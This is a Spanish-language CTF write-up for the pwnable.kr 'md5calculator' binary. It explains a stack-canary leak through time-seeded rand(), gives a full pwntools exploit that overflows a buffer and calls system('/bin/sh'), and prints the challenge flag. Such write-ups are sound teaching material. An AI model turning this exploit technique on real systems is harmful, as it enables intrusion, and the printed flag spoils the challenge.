# md5calculator

![md5 calculator](https://github.com/user-attachments/assets/47511071-9c25-460b-85f0-30650a870b07)

```
 ./md5calculator
- Welcome to the free MD5 calculating service -
Are you human? input captcha : 378101604
```

Si vamos a `my_hash` nos enteramos que el numero que devuelve es el resultado de una operacion con numeros aleatorios obtenidos con `rand()` y el stack_canary!:

Especificamente esta parte obtenida con gdb:
```
   0x08048f1c <+68>:    mov    eax,DWORD PTR [ebp-0x34]
   0x08048f1f <+71>:    add    eax,0x4
   0x08048f22 <+74>:    mov    edx,DWORD PTR [eax]
   0x08048f24 <+76>:    mov    eax,DWORD PTR [ebp-0x34]
   0x08048f27 <+79>:    add    eax,0x14
   0x08048f2a <+82>:    mov    eax,DWORD PTR [eax]
   0x08048f2c <+84>:    add    eax,edx
   0x08048f2e <+86>:    add    DWORD PTR [ebp-0x30],eax
   0x08048f31 <+89>:    mov    eax,DWORD PTR [ebp-0x34]
   0x08048f34 <+92>:    add    eax,0x8
   0x08048f37 <+95>:    mov    edx,DWORD PTR [eax]
   0x08048f39 <+97>:    mov    eax,DWORD PTR [ebp-0x34]
   0x08048f3c <+100>:   add    eax,0xc
   0x08048f3f <+103>:   mov    eax,DWORD PTR [eax]
   0x08048f41 <+105>:   mov    ecx,edx
   0x08048f43 <+107>:   sub    ecx,eax
   0x08048f45 <+109>:   mov    eax,ecx
   0x08048f47 <+111>:   add    DWORD PTR [ebp-0x30],eax
   0x08048f4a <+114>:   mov    eax,DWORD PTR [ebp-0x34]
   0x08048f4d <+117>:   add    eax,0x1c
   0x08048f50 <+120>:   mov    edx,DWORD PTR [eax]
   0x08048f52 <+122>:   mov    eax,DWORD PTR [ebp-0x34]
   0x08048f55 <+125>:   add    eax,0x20
=> 0x08048f58 <+128>:   mov    eax,DWORD PTR [eax]
   0x08048f5a <+130>:   add    eax,edx
   0x08048f5c <+132>:   add    DWORD PTR [ebp-0x30],eax
   0x08048f5f <+135>:   mov    eax,DWORD PTR [ebp-0x34]
   0x08048f62 <+138>:   add    eax,0x10
   0x08048f65 <+141>:   mov    edx,DWORD PTR [eax]
   0x08048f67 <+143>:   mov    eax,DWORD PTR [ebp-0x34]
   0x08048f6a <+146>:   add    eax,0x18
   0x08048f6d <+149>:   mov    eax,DWORD PTR [eax]
   0x08048f6f <+151>:   mov    ecx,edx
   0x08048f71 <+153>:   sub    ecx,eax
   0x08048f73 <+155>:   mov    eax,ecx
   0x08048f75 <+157>:   add    DWORD PTR [ebp-0x30],eax
   0x08048f78 <+160>:   mov    eax,DWORD PTR [ebp-0x30]
```

Se puede entender como:
```
[ebp-0x34] es un puntero al array en [ebp-0x2c] como sabemos de:

0x08048ee5 <+13>:    mov    DWORD PTR [ebp-0xc],eax
0x08048ee8 <+16>:    xor    eax,eax
0x08048eea <+18>:    lea    eax,[ebp-0x2c]

Llamemos "array" a [ebp-0x2c]:

+ 68  eax = &array[0]
+ 71  eax = &array[1]
+ 74  edx = array[1]
+ 76  eax = &array[0]
+ 79  eax = &array[5]
+ 82  eax = array[5]
+ 84  eax = array[1] + array[5]
+ 86  [ebp-0x30] = array[1] + array[5]
+ 89  eax = &array[0]
+ 92  eax = &array[2]
+ 95  edx = array[2]
+ 97  eax = &array[0]
+ 100 eax = &array[3]
+ 103 eax = array[3]
+ 105 ecx = array[2]
+ 107 ecx = array[2] - array[3]
+ 109 eax = array[2] - array[3]
+ 111 [ebp-0x30] =  array[1] + array[5] + (array[2] - array[3])
+ 114 eax = &array[0]
+ 117 eax = &array[7]
+ 120 edx = array[7]
+ 122 eax = &array[0]
+ 125 eax = &[ebp-0xc]
+ 128 eax = [ebp-0xc]
+ 130 eax = [ebp-0xc] + array[7]
+ 132 [ebp-0x30] =  array[1] + array[5] + (array[2] - array[3]) + [ebp-0xc] + array[7] 
+ 135 eax = &array[0]
+ 138 eax = &array[3]
+ 141 edx = array[4]
+ 143 eax = &array[0]
+ 146 eax = &array[6]
+ 149 eax = array[6]
+ 151 ecx = array[4]
+ 153 ecx = array[4] - array[6]
+ 155 eax = array[4] - array[6]
+ 157 eax = array[1] + array[5] + (array[2] - array[3]) + [ebp-0xc] + array[7] + (array[4] - array[6])
+ 160 return eax

Como puede verse aqui:
   0x08048edf <+7>:     mov    eax,gs:0x14
   0x08048ee5 <+13>:    mov    DWORD PTR [ebp-0xc],eax

[ebp-0xc] es el stack canary o stack cookie
```

En el decompilador de ghidra se ve mas claro:
``` C
/* WARNING: Restarted to delay deadcode elimination for space : stack */

int my_hash(void)

{
  int iVar1;
  int in_GS_OFFSET;
  int local_3c;
  int local_30 [8];
  int stack_cookie;
  
  stack_cookie = *(int *)(in_GS_OFFSET + 0x14);
  for (local_3c = 0; local_3c < 8; local_3c = local_3c + 1) {
    iVar1 = rand();
    local_30[local_3c] = iVar1;
  }
  if (stack_cookie != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_30[5] + local_30[1] + (local_30[2] - local_30[3]) +  stack_cookie + local_30[7] +
         (local_30[4] - local_30[6]);
}
```

Los numeros aleatorios generados con `rand()` con una semilla basada en tiempo en C se pueden reproducir si tomamos el tiempo actual dentro del mismo segundo en que se tomó en el programa.

Podemos extraer el canario y entonces, dado que el binario no tiene PIE hacer ROP para invocar a `system("/bin.sh")`.

En la funcion `process_hash` se toma la entrada de usuario y se almacenan 0x400 bytes en el buffer global `g_buf`, luego se pasa a ` Base64Decode` y el resultado se almacena en un buffer local `buffer[128]`.

Podemos codificar nuestra carga util en base64 (offset + ROP) y pasarsela como entrada, desbordar el buffer y controlar el flujo del programa.

Para invocar una shell necesitamos un puntero a "/bin/sh\x00". Podemos luego de la carga util en base64 enviar la cadena y pasarle como argumento a `system` `g_buf` + offset a la cadena.

![wall](https://github.com/user-attachments/assets/0539d26b-595f-4b44-b17b-aaf1a0974c09)

``` python
#!/usr/bin/env python3

from pwn import *
import time
import base64
from ctypes import CDLL

elf = ELF("./md5calculator")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break *0x0804902b
break *0x0804908e
'''

domain= "pwnable.kr"
port = 9002

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

# -- Grab the stack cookie --
RAND_MAX = 2**31-1
seed = int(time.time())
so = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
so.srand(seed)

numbers = []
for _ in range(8):
    numbers.append(so.rand() % (RAND_MAX + 1))

r.recvuntil(b"Are you human? input captcha : ")
sum = int(r.recvline().strip())

stack_cookie = sum - numbers[5] - numbers[1] - (numbers[2] - numbers[3]) - numbers[7] - (numbers[4] - numbers[6])

log.success("Predicted stack_cookie: {}".format(hex(stack_cookie & 0xFFFFFFFF)))

r.sendline(str(sum).encode())

# -- system("/bin/sh")
payload = b"A"*512 + p32(stack_cookie & 0xFFFFFFFF) + b"B"*12
payload += p32(elf.sym.system) + p32(0) + p32(0x0804b0e0 + 720)
payload = base64.b64encode(payload)

payload += b"/bin/sh\x00"

r.sendline(payload)
r.interactive()
```

`M3ssing_w1th_st4ck_Pr0tector`
